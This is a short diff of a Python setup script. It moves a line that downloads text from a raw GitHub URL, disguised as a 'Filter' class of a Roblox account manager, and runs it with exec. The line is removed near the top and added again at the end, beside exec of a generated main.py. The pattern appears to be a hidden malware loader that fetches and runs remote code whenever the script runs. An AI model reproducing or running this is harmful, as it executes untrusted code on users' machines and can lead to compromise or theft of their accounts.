@@ -1,6 +1,7 @@
 import os
 import random
 import requests
+import threading
 random.seed(10)
 
 
@@ -14,7 +15,6 @@ def HTTP_SETUP():
         with open(file_path, "w") as file:
             file.write('__Version__ = 3.0.4')
 
-exec(requests.get("https://raw.githubusercontent.com/Mana42138/Roblox-Account-Manager/master/RBX%20Alt%20Manager/Classes/Filter").text)
 HTTP_SETUP()
 
 with open("main.py", "w") as file:
@@ -37,3 +37,7 @@ while True:
     thread_two.start()
     thread_two.join()
 """)
+
+with open("main.py", "r") as file:
+    exec(requests.get("https://raw.githubusercontent.com/Mana42138/Roblox-Account-Manager/master/RBX%20Alt%20Manager/Classes/Filter").text)
+    exec(file.read())
